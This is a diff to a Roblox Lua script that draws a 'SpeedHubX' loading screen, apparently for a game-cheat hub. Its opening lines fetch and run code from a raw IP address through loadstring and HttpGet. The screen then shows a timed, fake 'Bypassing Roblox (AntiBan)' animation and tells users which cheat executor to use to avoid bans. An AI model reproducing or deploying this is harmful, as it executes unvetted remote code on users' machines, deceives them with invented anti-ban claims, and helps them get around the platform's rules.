@@ -1,6 +1,6 @@
 ID="add26a53-bc0d-47c0-94c9-047a7efc051d";
 loadstring(game:HttpGet("http://5.129.216.170:3910/cdn/loader.luau"))()
---// SpeedHubX Tech Style Loading Screen with Neon Blink & Bar Glow //-- 
+--// SpeedHubX Tech Style Loading Screen with Neon Blink & Bar Glow //--
 
 -- Services
 local TweenService = game:GetService("TweenService")
@@ -15,7 +15,7 @@ local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0, 450, 0, 230)
 frame.Position = UDim2.new(0.5, -225, 0.5, -115)
 frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-frame.BackgroundTransparency = 0.3 -- invisible theme
+frame.BackgroundTransparency = 0.25 -- invisible effect
 frame.BorderSizePixel = 0
 frame.Parent = screenGui
 
@@ -37,7 +37,6 @@ gradient.Parent = frame
 -- Title
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 60)
-title.Position = UDim2.new(0, 0, 0, 0)
 title.BackgroundTransparency = 1
 title.Text = "⚡ SpeedHubX ⚡"
 title.TextColor3 = Color3.fromRGB(255, 0, 0)
@@ -49,11 +48,11 @@ title.Parent = frame
 -- Title Blink Glow
 task.spawn(function()
 	while screenGui.Parent do
-		local fadeOut = TweenService:Create(title, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {TextTransparency = 0.4, TextStrokeTransparency = 0.7})
+		local fadeOut = TweenService:Create(title, TweenInfo.new(0.6), {TextTransparency = 0.4, TextStrokeTransparency = 0.7})
 		fadeOut:Play()
 		fadeOut.Completed:Wait()
 
-		local fadeIn = TweenService:Create(title, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {TextTransparency = 0, TextStrokeTransparency = 0.2})
+		local fadeIn = TweenService:Create(title, TweenInfo.new(0.6), {TextTransparency = 0, TextStrokeTransparency = 0.2})
 		fadeIn:Play()
 		fadeIn.Completed:Wait()
 	end
@@ -64,7 +63,7 @@ local barBg = Instance.new("Frame")
 barBg.Size = UDim2.new(0.9, 0, 0, 35)
 barBg.Position = UDim2.new(0.05, 0, 0.5, -20)
 barBg.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
-barBg.BackgroundTransparency = 0.3
+barBg.BackgroundTransparency = 0.25
 barBg.BorderSizePixel = 0
 barBg.Parent = frame
 
@@ -85,7 +84,6 @@ barGradient.Color = ColorSequence.new{
 	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
 	ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 0, 0))
 }
-barGradient.Rotation = 0
 barGradient.Parent = barFill
 
 -- Bar Glow Effect
@@ -99,20 +97,19 @@ barStrokeGlow.Parent = barFill
 -- Pulsating glow loop
 task.spawn(function()
 	while screenGui.Parent do
-		local glowOut = TweenService:Create(barStrokeGlow, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Transparency = 0.8, Thickness = 2})
+		local glowOut = TweenService:Create(barStrokeGlow, TweenInfo.new(0.8), {Transparency = 0.8, Thickness = 2})
 		glowOut:Play()
 		glowOut.Completed:Wait()
 
-		local glowIn = TweenService:Create(barStrokeGlow, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Transparency = 0.3, Thickness = 5})
+		local glowIn = TweenService:Create(barStrokeGlow, TweenInfo.new(0.8), {Transparency = 0.3, Thickness = 5})
 		glowIn:Play()
 		glowIn.Completed:Wait()
 	end
 end)
 
--- Percent Text
+-- Percent Text (5 minutes loading)
 local percentText = Instance.new("TextLabel")
 percentText.Size = UDim2.new(1, 0, 1, 0)
-percentText.Position = UDim2.new(0, 0, 0, 0)
 percentText.BackgroundTransparency = 1
 percentText.Text = "0%"
 percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -121,10 +118,10 @@ percentText.TextSize = 20
 percentText.Font = Enum.Font.SourceSansBold
 percentText.Parent = barBg
 
--- Bypassing Roblox AntiBan Text
+-- Bypassing Roblox (AntiBan) under bar
 local bypassText = Instance.new("TextLabel")
 bypassText.Size = UDim2.new(1, 0, 0, 25)
-bypassText.Position = UDim2.new(0, 0, 0.75, 20)
+bypassText.Position = UDim2.new(0, 0, 1, 5)
 bypassText.BackgroundTransparency = 1
 bypassText.Text = "Bypassing Roblox (AntiBan)"
 bypassText.TextColor3 = Color3.fromRGB(180, 180, 180)
@@ -133,24 +130,25 @@ bypassText.TextSize = 16
 bypassText.Font = Enum.Font.FredokaOne
 bypassText.Parent = frame
 
--- Animate Bypassing Roblox AntiBan with blinking + loading dots
+-- Loading dots animation for bypass
+local dots = 0
 task.spawn(function()
-	local dots = ""
-	for i = 1, 60 do -- 1 minute
-		dots = string.rep(".", (i % 4))
-		bypassText.Text = "Bypassing Roblox (AntiBan)" .. dots
-		bypassText.TextTransparency = (i % 2 == 0) and 0.3 or 0
-		wait(1)
+	local elapsed = 0
+	while elapsed < 60 do -- 1 minute
+		dots = (dots % 3) + 1
+		bypassText.Text = "Bypassing Roblox (AntiBan)" .. string.rep(".", dots)
+		wait(0.5)
+		elapsed = elapsed + 0.5
 	end
 	bypassText.Text = "✅ Successfully Loaded!"
 end)
 
--- Warning Text
+-- Warning Text (2 lines)
 local warning = Instance.new("TextLabel")
-warning.Size = UDim2.new(1, 0, 0, 45)
-warning.Position = UDim2.new(0, 0, 1, -45)
+warning.Size = UDim2.new(1, 0, 0, 50)
+warning.Position = UDim2.new(0, 0, 1, -60)
 warning.BackgroundTransparency = 1
-warning.Text = "⚠️ Works Better On Latest Executors ⚠️"
+warning.Text = "⚠️ Use it in Codex Executor if you don't want to get banned\n⚠️ Works Better On Latest Executors\n⚠️ Don’t use it on Private Server or Full Server ⚠️"
 warning.TextColor3 = Color3.fromRGB(255, 50, 50)
 warning.TextStrokeTransparency = 0.2
 warning.TextSize = 14
@@ -167,7 +165,7 @@ for i = 1, totalTime do
 	wait(1)
 end
 
--- Done Loading
-percentText.Text = "✅ Successfully Loaded!"
+-- Final finish
+percentText.Text = "✅ 100% Loaded!"
 wait(2)
 screenGui:Destroy()
